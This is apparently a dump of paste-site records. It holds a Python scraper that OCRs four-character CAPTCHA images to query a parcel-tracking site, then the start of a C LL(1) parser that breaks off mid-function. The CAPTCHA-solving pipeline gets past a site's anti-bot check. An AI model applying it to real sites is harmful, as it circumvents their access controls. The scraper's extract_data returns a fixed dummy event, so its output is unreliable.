output\n\xa0\n\xa0\n\xa0 \xa0 \xa0 \xa0\ndef denoise_image(image):\n\xa0 \xa0 # 1.1. denoise image using PIL\n\xa0 \xa0 image = denoise_image_pil(image)\n\xa0\n\xa0 \xa0 # 1.2. denoise image manually to remove the small objects (using BFS algorithm)\n\xa0 \xa0 image = remove_small_objects(image)\n\xa0 \xa0 return image\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0\ndef denoise_image_pil(image):\n\xa0 \xa0 image = image.convert(\'L\')\n\xa0\n\xa0 \xa0 image = image.point(lambda p: p > 150 and 255)\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \n\xa0 \xa0 return image\n\xa0 \xa0 \xa0 \xa0 \xa0\ndef remove_small_objects(image):\n\xa0 \xa0 width, height = image.size\n\xa0 \xa0 STEPS = (\n\xa0 \xa0 \xa0 \xa0 (1, 0),\n\xa0 \xa0 \xa0 \xa0 (0, 1),\n\xa0 \xa0 \xa0 \xa0 (-1, 0),\n\xa0 \xa0 \xa0 \xa0 (0, -1), \xa0 \xa0 \xa0 \xa0\n\xa0 \xa0 )\n\xa0 \xa0 WHITE_COLOR = 255\n\xa0\n\xa0 \xa0 def is_in_range(pos):\n\xa0 \xa0 \xa0 \xa0 return 0 <= pos[0] < width and 0 <= pos[1] < height\n\xa0\n\xa0 \xa0 def bfs(pos):\n\xa0 \xa0 \xa0 \xa0 queue = deque()\n\xa0 \xa0 \xa0 \xa0 queue.append(pos)\n\xa0 \xa0 \xa0 \xa0 visited_points = set()\n\xa0 \xa0 \xa0 \xa0 visited_points.add(pos)\n\xa0 \xa0 \xa0 \xa0 \n\xa0 \xa0 \xa0 \xa0 while len(queue):\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 current_pos = queue.popleft()\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 for step in STEPS:\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 next_pos = (current_pos[0] + step[0], current_pos[1] + step[1])\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 if is_in_range(next_pos) and image.getpixel(next_pos) != WHITE_COLOR and next_pos not in visited_points:\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 visited_points.add(next_pos)\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 queue.append(next_pos) \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \n\xa0 \xa0 \xa0 \xa0 if len(visited_points) <= 30:\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 for point in visited_points:\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 image.putpixel(point, WHITE_COLOR)\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \n\xa0 \xa0 for x in range(width):\n\xa0 \xa0 \xa0 \xa0 for y in range(height):\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 if image.getpixel((x, y)) != WHITE_COLOR:\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 bfs((x, y))\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \n\xa0 \xa0 return image\n\xa0\ndef delate_image(image):\n\xa0 \xa0 total_visited_points = set()\n\xa0 \xa0 height, width = image.shape\n\xa0 \xa0 STEPS = (\n\xa0 \xa0 \xa0 \xa0 (1, 0),\n\xa0 \xa0 \xa0 \xa0 (0, 1),\n\xa0 \xa0 \xa0 \xa0 (-1, 0),\n\xa0 \xa0 \xa0 \xa0 (0, -1), \xa0 \xa0 \xa0 \xa0\n\xa0 \xa0 )\n\xa0 \xa0 WHITE_COLOR = 255\n\xa0\n\xa0\n\xa0 \xa0 def is_in_range(pos):\n\xa0 \xa0 \xa0 \xa0 return 0 <= pos[0] < width and 0 <= pos[1] < height\n\xa0\n\xa0 \xa0 def bfs(pos):\n\xa0 \xa0 \xa0 \xa0 queue = deque()\n\xa0 \xa0 \xa0 \xa0 queue.append(pos)\n\xa0 \xa0 \xa0 \xa0 visited_points = set()\n\xa0 \xa0 \xa0 \xa0 black_visited_points = set()\n\xa0 \xa0 \xa0 \xa0 visited_points.add(pos)\n\xa0 \xa0 \xa0 \xa0 \n\xa0 \xa0 \xa0 \xa0 while len(queue):\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 current_pos = queue.popleft()\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 for step in STEPS:\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 next_pos = (current_pos[0] + step[0], current_pos[1] + step[1])\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 if is_in_range(next_pos) and image[next_pos[1], next_pos[0]] == WHITE_COLOR and next_pos not in visited_points:\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 visited_points.add(next_pos)\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 queue.append(next_pos) \xa0 \xa0 \n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 elif is_in_range(next_pos) and image[next_pos[1], next_pos[0]] != WHITE_COLOR and next_pos not in black_visited_points:\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 black_visited_points.add(next_pos)\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \n\xa0 \xa0 \xa0 \xa0 for point in black_visited_points:\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 image[point[1], point[0]] = 100\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 visited_points.add(point)\n\xa0\n\xa0 \xa0 \xa0 \xa0 return visited_points \xa0 \n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \n\xa0 \xa0 # for x in range(width):\n\xa0 \xa0 # \xa0 \xa0 for y in range(height):\n\xa0 \xa0 # \xa0 \xa0 \xa0 \xa0 if image[y, x] == WHITE_COLOR and (x, y) not in total_visited_points:\n\xa0 \xa0 visited_points = bfs((0, 0))\n\xa0 \xa0 total_visited_points.update(visited_points)\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 # break\n\xa0\n\xa0 \xa0 return image\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \ndef split_image(image):\n\xa0 \xa0 SPLITED_IMAGE_SIZE = (30, 30)\n\xa0 \xa0 total_visited_points = set()\n\xa0 \xa0 height, width = image.shape\n\xa0 \xa0 STEPS = (\n\xa0 \xa0 \xa0 \xa0 (1, 0),\n\xa0 \xa0 \xa0 \xa0 (0, 1),\n\xa0 \xa0 \xa0 \xa0 (-1, 0),\n\xa0 \xa0 \xa0 \xa0 (0, -1), \xa0 \xa0 \xa0 \xa0\n\xa0 \xa0 )\n\xa0 \xa0 WHITE_COLOR = 255\n\xa0\n\xa0 \xa0 def point_to_image(points):\n\xa0 \xa0 \xa0 \xa0 min_x = min(map(lambda point: point[0], points))\n\xa0 \xa0 \xa0 \xa0 max_x = max(map(lambda point: point[0], points))\n\xa0 \xa0 \xa0 \xa0 \n\xa0 \xa0 \xa0 \xa0 min_y = min(map(lambda point: point[1], points))\n\xa0 \xa0 \xa0 \xa0 max_y = max(map(lambda point: point[1], points))\n\xa0 \xa0 \xa0 \xa0 \n\xa0 \xa0 \xa0 \xa0 image = np.empty((max_y - min_y + 1, max_x - min_x + 1, 1), dtype = ""uint8"")\n\xa0 \xa0 \xa0 \xa0 image.fill(255)\n\xa0 \xa0 \xa0 \xa0 \n\xa0 \xa0 \xa0 \xa0 for point in points:\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 image[point[1] - min_y, point[0] - min_x] = 0\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \n\xa0 \xa0 \xa0 \xa0 x_space = SPLITED_IMAGE_SIZE[0] - (max_x - min_x + 1)\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \n\xa0 \xa0 \xa0 \xa0 image = cv2.copyMakeBorder(\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 image,\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 top=SPLITED_IMAGE_SIZE[1] - (max_y - min_y + 1),\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 bottom=10,\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 left=x_space//2,\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 right=x_space - x_space//2,\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 borderType=cv2.BORDER_CONSTANT,\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 value=(255, 255, 255)\n\xa0 \xa0 \xa0 \xa0 ) \xa0 \xa0\n\xa0 \xa0 \xa0 \xa0 \n\xa0 \xa0 \xa0 \xa0 return image\n\xa0\n\xa0 \xa0 def is_in_range(pos):\n\xa0 \xa0 \xa0 \xa0 return 0 <= pos[0] < width and 0 <= pos[1] < height\n\xa0\n\xa0 \xa0 def bfs(pos):\n\xa0 \xa0 \xa0 \xa0 queue = deque()\n\xa0 \xa0 \xa0 \xa0 queue.append(pos)\n\xa0 \xa0 \xa0 \xa0 visited_points = set()\n\xa0 \xa0 \xa0 \xa0 visited_points.add(pos)\n\xa0 \xa0 \xa0 \xa0 \n\xa0 \xa0 \xa0 \xa0 while len(queue):\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 current_pos = queue.popleft()\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 for step in STEPS:\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 next_pos = (current_pos[0] + step[0], current_pos[1] + step[1])\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 if is_in_range(next_pos) and image[next_pos[1], next_pos[0]] != WHITE_COLOR and next_pos not in visited_points:\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 visited_points.add(next_pos)\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 queue.append(next_pos) \xa0 \xa0 \n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \n\xa0 \xa0 \xa0 \xa0 return visited_points \xa0 \n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \n\xa0 \xa0 images = []\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \n\xa0 \xa0 for x in range(width):\n\xa0 \xa0 \xa0 \xa0 for y in range(height):\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 if image[y, x] != WHITE_COLOR and (x, y) not in total_visited_points:\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 visited_points = bfs((x, y))\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 total_visited_points.update(visited_points)\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 images.append(point_to_image(visited_points))\n\xa0\n\xa0 \xa0 try:\n\xa0 \xa0 \xa0 \xa0 assert(len(images) == 4)\n\xa0 \xa0 except Exception:\n\xa0 \xa0 \xa0 \xa0 print(""sticky image"")\n\xa0\n\xa0 \xa0 return images\n\xa0 \xa0 \ndef make_inner_border(image):\n\xa0 \xa0 height, width = image.shape\n\xa0 \xa0 image = cv2.line(image, (0, 0), (0, height), (255, 255, 255), 2)\n\xa0 \xa0 image = cv2.line(image, (0, 0), (width, 0), (255, 255, 255), 2)\n\xa0 \xa0 image = cv2.line(image, (width, 0), (width, height), (255, 255, 255), 2)\n\xa0 \xa0 image = cv2.line(image, (0, height), (width, height), (255, 255, 255), 2)\n\xa0 \xa0 return image\n\xa0 \xa0 \ndef coordinate_character(image):\n\xa0 \xa0 BOTTOM_DISTANCE = 8\n\xa0 \xa0 height, width = image.shape\n\xa0 \xa0 \n\xa0 \xa0 y = height - 1\n\xa0 \xa0 \n\xa0 \xa0 while y >= 0:\n\xa0 \xa0 \xa0 \xa0 is_bottom_y = False\n\xa0 \xa0 \xa0 \xa0 for x in range(width):\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 if image[y][x] != 255:\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 is_bottom_y = True\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 break\n\xa0 \xa0 \xa0 \xa0 \n\xa0 \xa0 \xa0 \xa0 if is_bottom_y:\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 break\n\xa0 \xa0 \xa0 \xa0 y -= 1\n\xa0 \xa0 \xa0 \xa0 \n\xa0 \xa0 move_matrix = np.float32([[1, 0, 0], [0, 1, height - BOTTOM_DISTANCE - y]])\n\xa0 \xa0 dimensions = (width, height)\n\xa0 \xa0 return cv2.warpAffine(image, move_matrix, dimensions, borderValue=255)\n\xa0\ndef deskew_image(image):\n\xa0 \xa0 # 3.1. make a white inner border to remove sticky parts when spliting images -> get correct contour\n\xa0 \xa0 image = make_inner_border(image)\n\xa0 \xa0 \n\xa0 \xa0 # 3.2. get the contour for character\n\xa0 \xa0 contours, hierarchy = cv2.findContours(image, cv2.RETR_TREE, cv2.CHAIN_APPROX_SIMPLE)\n\xa0 \xa0 if len(contours) > 1:\n\xa0 \xa0 \xa0 \xa0 contour = contours[1]\n\xa0 \xa0 else:\n\xa0 \xa0 \xa0 \xa0 contour = contours[0]\n\xa0 \xa0 \xa0 \xa0 \n\xa0 \xa0 # 3.3. get the minimum area rectangle of contour\n\xa0 \xa0 rect = cv2.minAreaRect(contour)\n\xa0 \xa0 fbox = cv2.boxPoints(rect)\n\xa0 \xa0 box = np.int0(fbox)\n\xa0 \xa0 # image = cv2.drawContours(image,[box], 0, (100,100,100), 1)\n\xa0 \xa0 \n\xa0 \xa0 # 3.4. get the center line\n\xa0 \xa0 rows, cols = image.shape[:2]\n\xa0 \xa0 vx, vy, x, y = cv2.fitLine(contour, cv2.DIST_L2, 0, 0.01, 0.01)\n\xa0 \xa0 lefty = int((-x * vy / vx) + y)\n\xa0 \xa0 righty = int(((cols - x) * vy / vx) + y)\n\xa0 \xa0 \n\xa0 \xa0 left_point = (0, lefty)\n\xa0 \xa0 right_point = (cols - 1, righty)\n\xa0 \xa0 # image = cv2.line(image, right_point, left_point, (0,255,0), 1)\n\xa0 \xa0 \n\xa0 \xa0 is_left_inclined_line = (lefty < righty)\n\xa0 \xa0 \n\xa0 \xa0 # M = cv2.moments(contour)\n\xa0 \xa0 # cX = int(M[""m10""] / M[""m00""])\n\xa0 \xa0 # cY = int(M[""m01""] / M[""m00""])\n\xa0\n\xa0 \xa0 # 3.5. get 2 top points & calculate the angle\n\xa0 \xa0 fbox = sorted(fbox, key=lambda point: point[1])\n\xa0 \xa0 top_point_1 = fbox[0]\n\xa0 \xa0 top_point_2 = fbox[1]\n\xa0 \xa0 \n\xa0 \xa0 is_left_angle = (top_point_1[0] > top_point_2[0])\n\xa0 \xa0 \n\xa0 \xa0 # 3.5.1. using tan function in Trigonometry\n\xa0 \xa0 height = abs(top_point_1[1] - top_point_2[1])\n\xa0 \xa0 base = abs(top_point_1[0] - top_point_2[0])\n\xa0 \xa0 angle = math.degrees(math.atan(height/base))\n\xa0 \xa0 \n\xa0 \xa0 if is_left_angle:\n\xa0 \xa0 \xa0 \xa0 angle = -angle\n\xa0 \xa0 \n\xa0 \xa0 # print(abs(abs(angle) - 45), is_left_angle, is_left_inclined_line)\n\xa0 \xa0 # using center line to check 2 top points when the angle nearly 45 degree\n\xa0 \xa0 if abs(abs(angle) - 45) <= 5 and is_left_inclined_line != is_left_angle:\n\xa0 \xa0 \xa0 \xa0 top_point_2 = fbox[2]\n\xa0 \xa0 \xa0 \xa0 \n\xa0 \xa0 \xa0 \xa0 is_left_angle = (top_point_1[0] > top_point_2[0])\n\xa0 \xa0 \n\xa0 \xa0 \xa0 \xa0 height = abs(top_point_1[1] - top_point_2[1])\n\xa0 \xa0 \xa0 \xa0 base = abs(top_point_1[0] - top_point_2[0])\n\xa0 \xa0 \xa0 \xa0 angle = math.degrees(math.atan(height/base))\n\xa0 \xa0 \xa0 \xa0 \n\xa0 \xa0 \xa0 \xa0 if is_left_angle:\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 angle = -angle\n\xa0 \xa0 \xa0 \xa0 \n\xa0 \xa0 # print(angle)\n\xa0\n\xa0 \xa0 # 3.6. deskew the image\n\xa0 \xa0 (h, w) = image.shape[:2]\n\xa0 \xa0 center = (w // 2, h // 2)\n\xa0 \xa0 M = cv2.getRotationMatrix2D(center, angle, 1.0)\n\xa0 \xa0 image = cv2.warpAffine(image, M, (w, h), flags=cv2.INTER_CUBIC, borderMode=cv2.BORDER_REPLICATE)\n\xa0 \xa0 \n\xa0 \xa0 return image\n\xa0\ndef preprocess_image(image): \n\xa0 \xa0 image.save(""output_image_retscn_origin.png"")\n\xa0 \xa0 # 1. denoise image\n\xa0 \xa0 image = denoise_image(image)\n\xa0 \xa0 \n\xa0 \xa0 # convert PIL image to cv2 image\n\xa0 \xa0 np_image = np.array(image)\n\xa0 \xa0 image = cv2.cvtColor(np_image, cv2.COLOR_RGB2BGR)\n\xa0 \xa0 image = cv2.cvtColor(image, cv2.COLOR_BGR2GRAY)\n\xa0 \xa0 \n\xa0 \xa0 # 2. split image to 4 character images\n\xa0 \xa0 # image_1, image_2, image_3, image_4 = split_image(image) \xa0\n\xa0 \xa0 images = split_image(image)\n\xa0 \xa0 \n\xa0 \xa0 # 3. deskew images\n\xa0 \xa0 for i in range(len(images)):\n\xa0 \xa0 \xa0 \xa0 images[i] = deskew_image(images[i])\n\xa0 \xa0 # image_1 = deskew_image(image_1)\n\xa0 \xa0 # image_2 = deskew_image(image_2)\n\xa0 \xa0 # image_3 = deskew_image(image_3)\n\xa0 \xa0 # image_4 = deskew_image(image_4)\n\xa0 \xa0 \n\xa0 \xa0 # 4. coordinate the characters \n\xa0 \xa0 for i in range(len(images)):\n\xa0 \xa0 \xa0 \xa0 coordinate_character(images[i])\n\xa0 \xa0 # image_1 = coordinate_character(image_1)\n\xa0 \xa0 # image_2 = coordinate_character(image_2)\n\xa0 \xa0 # image_3 = coordinate_character(image_3)\n\xa0 \xa0 # image_4 = coordinate_character(image_4)\n\xa0 \xa0 \n\xa0\n\xa0 \xa0 # 5. merge the images\n\xa0 \xa0 # image = np.concatenate((image_1, image_2, image_3, image_4), axis=1)\n\xa0 \xa0 image = np.concatenate(images, axis=1)\n\xa0 \xa0 height, width = image.shape\n\xa0 \xa0 image = cv2.resize(image, (width * 4, height * 5), interpolation=cv2.INTER_AREA)\n\xa0 \xa0 cv2.imwrite(""output_image_rest_cn_2.png"", image)\n\xa0\n\xa0 \xa0 # convert cv2 image to PIL image\n\xa0 \xa0 image = cv2.cvtColor(image, cv2.COLOR_BGR2RGB)\n\xa0 \xa0 image = Image.fromarray(image)\n\xa0 \xa0 return image\n\xa0\nclass RETSCNScraper(BaseScraperItemPipeline, CookieMixin):\n\xa0 \xa0 name = ""RETSCNScraper""\n\xa0\n\xa0 \xa0 def __init__(self, name=None, **kwargs):\n\xa0 \xa0 \xa0 \xa0 super(RETSCNScraper, self).__init__(name, **kwargs)\n\xa0 \xa0 \xa0 \xa0 self.start_urls = [RETSCN_BASE_URL]\n\xa0 \xa0 \xa0 \xa0 self.max_retry = 0\n\xa0 \xa0 \xa0 \xa0 self.retry_count = 0\n\xa0\n\xa0 \xa0 def parse(self, response):\n\xa0 \xa0 \xa0 \xa0 self.update_local_cookie(response)\n\xa0 \xa0 \xa0 \xa0 try:\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 image = Image.open(io.BytesIO(response.body))\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 # captcha_txt = post_process_captcha(pytesseract.image_to_string(image, config=\'--psm 13\'))\n\xa0\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 captcha_txt = post_process_captcha(\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 pytesseract.image_to_string(preprocess_image(image))\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 )\n\xa0 \xa0 \xa0 \xa0 except Exception:\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 activity_logger.info(\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 ""{} {} cannot get captcha image"".format(self.name, self.parcel_id)\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 )\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 return self.save_result([])\n\xa0\n\xa0 \xa0 \xa0 \xa0 print(""captcha result:"", captcha_txt)\n\xa0 \xa0 \xa0 \xa0 # Captcha always has 4 characters\n\xa0 \xa0 \xa0 \xa0 if captcha_txt and len(captcha_txt) == 4:\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 formdata = {""danhao"": self.parcel_id, ""yanzhengma"": captcha_txt}\n\xa0\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 # After solving captcha and post to the endpoint it will return the actual track url\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 return self.produce_request(\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 FormRequest,\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 RETSCN_TRACK_URL,\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 formdata=formdata,\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 cookies=self.cookies,\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 method=""POST"",\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 callback=self.extract_data,\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 errback=self.error_call_back,\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 )\n\xa0 \xa0 \xa0 \xa0 elif self.retry_count < self.max_retry:\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 return self.save_result([])\n\xa0 \xa0 \xa0 \xa0 else:\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 return self.save_result([])\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \n\xa0 \xa0 def extract_data(self, response):\n\xa0 \xa0 \xa0 \xa0 event_list = response.css("".text"")\n\xa0\n\xa0 \xa0 \xa0 \xa0 events = []\n\xa0 \xa0 \xa0 \xa0 if event_list:\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 events = [\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 ""event_type"": ""asdsad"",\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 ""event_time"": ""2022-03-12T12:30:00""\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 }\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 ]\n\xa0\n\xa0 \xa0 \xa0 \xa0 return self.save_result(events)', date='2022-06-01 08:36:58 +00:00', hash_val='01564311bbe1484a1f9dc5da1794d29d', url='/pUcaN6zw', timezones={'CST': tzfile('/usr/share/zoneinfo/US/Central'), 'CDT': tzfile('/usr/share/zoneinfo/US/Central'), 'EST': tzfile('/usr/share/zoneinfo/US/Eastern'), 'EDT': tzfile('/usr/share/zoneinfo/US/Eastern'), 'MST': tzfile('/usr/share/zoneinfo/US/Mountain'), 'MDT': tzfile('/usr/share/zoneinfo/US/Mountain'), 'PST': tzfile('/usr/share/zoneinfo/US/Pacific'), 'PDT': tzfile('/usr/share/zoneinfo/US/Pacific'), 'UTC': tzfile('/usr/share/zoneinfo/UTC')}), DataStructure(author='maycod23', title='LL_1_Parser', content='// #include<iostream>\n// using namespace std;\n#include<stdio.h>\n#include<string.h>\n#define TSIZE 128\nint table[100][TSIZE];\nchar terminal[TSIZE];\nchar nonterminal[26];\nstruct product {\n\xa0 \xa0 char str[100];\n\xa0 \xa0 int len;\n} pro[20];\nint no_pro;\nchar first[26][TSIZE];\nchar follow[26][TSIZE];\nchar first_rhs[100][TSIZE];\nint isNT(char c) {return c >= \'A\' && c <= \'Z\';}\nvoid readFromFile()\n{ \xa0 FILE* fptr;\n\xa0 \xa0 fptr = fopen(""code.txt"", ""r"");\n\xa0 \xa0 char buffer[255];\n\xa0 \xa0 int i, j;\n\xa0 \xa0 while (fgets(buffer, sizeof(buffer), fptr)) {\n\xa0 \xa0 \xa0 \xa0 printf(""%s"", buffer);\n\xa0 \xa0 \xa0 \xa0 j = 0;\n\xa0 \xa0 \xa0 \xa0 nonterminal[buffer[0] - \'A\'] = 1;\n\xa0 \xa0 \xa0 \xa0 for (i = 0; i < strlen(buffer) - 1; ++i) {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 if (buffer[i] == \'|\') {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 ++no_pro;\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 pro[no_pro - 1].str[j] = \'\\0\';\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 pro[no_pro - 1].len = j;\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 pro[no_pro].str[0] = pro[no_pro - 1].str[0];\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 pro[no_pro].str[1] = pro[no_pro - 1].str[1];\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 pro[no_pro].str[2] = pro[no_pro - 1].str[2];\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 j = 3;\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 }\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 else {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 pro[no_pro].str[j] = buffer[i];\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 ++j;\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 if (!isNT(buffer[i]) && buffer[i] != \'-\' && buffer[i] != \'>\') {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 terminal[buffer[i]] = 1;\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 }\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 }\n\xa0 \xa0 \xa0 \xa0 }\n\xa0 \xa0 \xa0 \xa0 pro[no_pro].len = j;\n\xa0 \xa0 \xa0 \xa0 ++no_pro;\n\xa0 \xa0 }\n}\nvoid add_FIRST_A_to_FOLLOW_B(char A, char B)\n{ \xa0 int i;\n\xa0 \xa0 for (i = 0; i < TSIZE; ++i) {\n\xa0 \xa0 \xa0 \xa0 if (i != \'^\')\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 follow[B - \'A\'][i] = follow[B - \'A\'][i] || first[A - \'A\'][i];\n\xa0 \xa0 }\n}\nvoid add_FOLLOW_A_to_FOLLOW_B(char A, char B)\n{ \xa0 int i;\n\xa0 \xa0 for (i = 0; i < TSIZE; ++i) {\n\xa0 \xa0 \xa0 \xa0 if (i != \'^\')\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 follow[B - \'A\'][i] = follow[B - \'A\'][i] || follow[A - \'A\'][i];\n\xa0 \xa0 }\n}\nvoid FOLLOW()\n{ \xa0 int t = 0;\n\xa0 \xa0 int i, j, k, x;\n\xa0 \xa0 while (t++ < no_pro) {\n\xa0 \xa0 \xa0 \xa0 for (k = 0; k < 26; ++k) {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 if (!nonterminal[k]) continue;\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 char nt = k + \'A\';\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 for (i = 0; i < no_pro; ++i) {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 for (j = 3; j < pro[i].len; ++j) {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 if (nt == pro[i].str[j]) {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 for (x = j + 1; x < pro[i].len; ++x) {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 char sc = pro[i].str[x];\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 if (isNT(sc)) {\n\xa0 \xa0 